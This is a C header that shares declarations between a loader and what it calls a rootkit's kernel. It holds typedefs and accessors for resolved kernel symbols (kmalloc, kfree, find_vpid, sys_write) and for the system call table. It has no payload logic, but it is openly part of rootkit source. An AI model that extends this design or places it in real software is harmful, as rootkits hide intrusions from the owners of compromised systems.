/*
 * Here the shared functions and variables between loader and rootkit's kernel.
 */

#ifndef SHARED_KERNEL_H

/*
 * Rootkit's kernel functions.
 */
extern int pinfo(const char *fmt, ...);
extern int perr(const char *fmt, ...);
extern void kernel_test(void);

/*
 * Symbols obtained from loader, passed to rootkit's kernel.
 */
typedef void * (*tf_kmalloc)(size_t size, gfp_t flags);
typedef void (*tf_kfree)(const void *);
typedef struct pid * (*tf_find_vpid)(pid_t nr);
typedef int (*tf_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
typedef int (*tf_sys_write)(int fd, const char *mem, size_t len);

extern tf_kmalloc *f_kmalloc(void);
extern tf_kfree *f_kfree(void);
extern tf_find_vpid *f_find_vpid(void);
extern tf_vscnprintf *f_vscnprintf(void);
extern tf_sys_write *f_sys_write(void);

extern void ***sys_call_table(void);

/*
 * Labels.
 */
extern void kernel_start(void);
extern void kernel_code_end(void);
extern void kernel_end(void);

#define SHARED_KERNEL_H

#endif
